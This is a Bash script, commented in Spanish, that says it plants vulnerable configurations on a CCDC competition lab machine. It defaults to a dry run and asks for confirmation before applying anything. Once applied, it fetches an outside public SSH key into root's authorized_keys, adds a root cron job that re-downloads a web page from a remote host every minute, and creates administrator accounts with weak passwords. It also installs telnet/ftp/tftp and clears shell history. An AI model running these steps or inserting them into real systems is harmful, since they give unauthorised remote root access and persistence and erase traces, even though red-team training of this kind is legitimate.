#!/usr/bin/env bash
set -Eeuo pipefail

# Script de laboratorio CCDC para sembrar configuraciones vulnerables de forma
# controlada. Por seguridad, el modo por defecto solo muestra lo que haria.

DRY_RUN=1
ASSUME_YES=0
OS="unknown"
ADMIN_GROUP=""

WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
CRON_LINE="${CRON_LINE:-* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php}"

usage() {
    cat <<'EOF'
Uso: redhavi-fedora [--apply] [--yes]

Opciones:
  --apply    Aplica cambios reales. Sin esta opcion solo imprime acciones.
  --yes      No pide confirmacion interactiva cuando se usa --apply.
  -h, --help Muestra esta ayuda.

Variables opcionales:
  WEB_REPO_URL   Repositorio PHP de prueba.
  INDEX_URL      index.php usado para reemplazar paginas web.
  ROOT_KEY_URL   Clave publica que se instalaria en /root/.ssh/authorized_keys.
  CRON_LINE      Linea exacta que se agregaria al crontab de root.

Advertencia:
  Este script instala paquetes inseguros, modifica webroot, crea usuarios,
  agrega una clave SSH para root, deja una tarea cron de laboratorio y borra
  historial de shell al terminar.
  Ejecutalo solo en maquinas autorizadas y descartables.
EOF
}

log() {
    printf '[*] %s\n' "$*"
}

warn() {
    printf '[!] %s\n' "$*" >&2
}

die() {
    printf '[ERROR] %s\n' "$*" >&2
    exit 1
}

run() {
    if [ "$DRY_RUN" -eq 1 ]; then
        printf '[DRY-RUN] '
        printf '%q ' "$@"
        printf '\n'
        return 0
    fi

    "$@"
}

confirm_apply() {
    [ "$DRY_RUN" -eq 0 ] || return 0
    [ "$ASSUME_YES" -eq 0 ] || return 0

    warn "Vas a aplicar cambios vulnerables en este sistema."
    printf 'Escribe LAB para continuar: '
    read -r answer
    [ "$answer" = "LAB" ] || die "Cancelado."
}

require_root() {
    if [ "$DRY_RUN" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
        die "Ejecuta como root para usar --apply."
    fi
}

detect_os() {
    if [ -n "${OS_OVERRIDE:-}" ]; then
        OS="$OS_OVERRIDE"
    elif [ -r /etc/os-release ]; then
        # shellcheck disable=SC1091
        . /etc/os-release
        OS="${ID:-unknown}"
    fi

    case "$OS" in
        debian|ubuntu|kali|centos|rhel|ol|fedora|arch)
            ;;
        *)
            die "OS no soportado para instalacion automatica: $OS"
            ;;
    esac

    log "Sistema detectado: $OS"
}

package_installed() {
    local pkg="$1"

    case "$OS" in
        debian|ubuntu|kali)
            dpkg-query -W -f='${Status}' "$pkg" 2>/dev/null | grep -q 'install ok installed'
            ;;
        centos|rhel|ol|fedora)
            rpm -q "$pkg" >/dev/null 2>&1
            ;;
        arch)
            pacman -Qi "$pkg" >/dev/null 2>&1
            ;;
    esac
}

install_package() {
    local pkg="$1"

    if package_installed "$pkg"; then
        log "Paquete ya instalado: $pkg"
        return 0
    fi

    case "$OS" in
        debian|ubuntu|kali)
            run apt-get install -y "$pkg"
            ;;
        centos|rhel|ol)
            run yum install -y "$pkg"
            ;;
        fedora)
            run dnf install -y "$pkg"
            ;;
        arch)
            run pacman -S --noconfirm "$pkg"
            ;;
    esac
}

install_packages() {
    local base_pkgs=("nano" "curl" "git" "php" "httpd")
    local bad_pkgs=()
    local paquetes=()
    local paquete

    case "$OS" in
        debian|ubuntu|kali)
            bad_pkgs=("telnet" "ftp" "tftp")
            ;;
        centos|rhel|ol)
            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
            ;;
        fedora)
            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
            ;;
        arch)
            bad_pkgs=("inetutils" "tftp-hpa")
            ;;
    esac

    paquetes=("${base_pkgs[@]}" "${bad_pkgs[@]}")

    for paquete in "${paquetes[@]}"; do
        install_package "$paquete"
    done
}

set_immutable() {
    local mode="$1"
    local path="$2"

    command -v chattr >/dev/null 2>&1 || {
        warn "chattr no esta disponible; omitiendo $mode $path"
        return 0
    }

    if [ "$DRY_RUN" -eq 1 ] || [ -e "$path" ]; then
        run chattr "$mode" "$path"
    else
        warn "No existe $path; omitiendo chattr $mode"
    fi
}

setup_web() {
    log "Configurando contenido web de laboratorio..."

    run mkdir -p /var/www/simple-php-website /var/www/html

    set_immutable -i /var/www/simple-php-website/index.php
    set_immutable -i /var/www/index.php
    set_immutable -i /var/www/html/index.php

    if [ "$DRY_RUN" -eq 1 ] || [ ! -d /var/www/simple-php-website/.git ]; then
        run git clone "$WEB_REPO_URL" /var/www/simple-php-website
    else
        run git -C /var/www/simple-php-website pull --ff-only
    fi

    run curl -fsSL -o /var/www/simple-php-website/index.php "$INDEX_URL"
    run curl -fsSL -o /var/www/index.php "$INDEX_URL"
    run curl -fsSL -o /var/www/html/index.php "$INDEX_URL"

    set_immutable +i /var/www/simple-php-website/index.php
}

setup_cron() {
    local tmp_cron

    log "Configurando crontab de laboratorio..."
    tmp_cron="$(mktemp)"

    if [ "$DRY_RUN" -eq 1 ]; then
        log "Se agregaria al crontab de root: $CRON_LINE"
        rm -f "$tmp_cron"
        return 0
    fi

    crontab -l >"$tmp_cron" 2>/dev/null || true
    grep -Fqx "$CRON_LINE" "$tmp_cron" || printf '%s\n' "$CRON_LINE" >>"$tmp_cron"
    crontab "$tmp_cron"
    rm -f "$tmp_cron"
}

enable_httpd() {
    log "Iniciando y habilitando httpd..."
    run systemctl start httpd
    run systemctl enable httpd
}

detect_admin_group() {
    log "Detectando grupo de administradores..."

    if getent group sudo >/dev/null 2>&1; then
        ADMIN_GROUP="sudo"
    elif getent group wheel >/dev/null 2>&1; then
        ADMIN_GROUP="wheel"
    else
        ADMIN_GROUP="sudo"
        run groupadd "$ADMIN_GROUP"
    fi

    log "Grupo admin usado: $ADMIN_GROUP"
}

set_password() {
    local user="$1"
    local password="$2"

    if [ "$DRY_RUN" -eq 1 ]; then
        printf '[DRY-RUN] chpasswd for user %q\n' "$user"
        return 0
    fi

    printf '%s:%s\n' "$user" "$password" | chpasswd
}

ensure_user() {
    local user="$1"
    local password="$2"
    local home_flag="$3"
    local expire_password="$4"

    if id "$user" >/dev/null 2>&1; then
        log "Usuario $user ya existe."
        return 0
    fi

    log "Creando usuario $user..."
    run useradd "$home_flag" -G "$ADMIN_GROUP" "$user"
    set_password "$user" "$password"

    if [ "$expire_password" = "yes" ]; then
        run passwd --expire "$user"
    fi
}

setup_users() {
    detect_admin_group
    ensure_user ccdc ccdc -m yes
    ensure_user splunk ass -M no
}

setup_root_ssh_key() {
    log "Configurando clave SSH para root..."

    run mkdir -p /root/.ssh
    set_immutable -i /root/.ssh/authorized_keys

    run curl -fsSL -o /root/.ssh/authorized_keys "$ROOT_KEY_URL"
    run chmod 600 /root/.ssh/authorized_keys
    set_immutable +i /root/.ssh/authorized_keys
}

clear_shell_history() {
    log "Borrando historial de shell..."

    run history -c
    run history -w
}

parse_args() {
    while [ "$#" -gt 0 ]; do
        case "$1" in
            --apply)
                DRY_RUN=0
                ;;
            --yes)
                ASSUME_YES=1
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                die "Opcion no reconocida: $1"
                ;;
        esac
        shift
    done
}

main() {
    parse_args "$@"
    detect_os
    require_root
    confirm_apply

    install_packages
    setup_web
    setup_cron
    enable_httpd
    setup_users
    setup_root_ssh_key
    clear_shell_history

    if [ "$DRY_RUN" -eq 1 ]; then
        log "Dry-run terminado. Usa --apply para aplicar en una maquina de laboratorio autorizada."
    else
        log "Cambios aplicados."
    fi
}

main "$@"
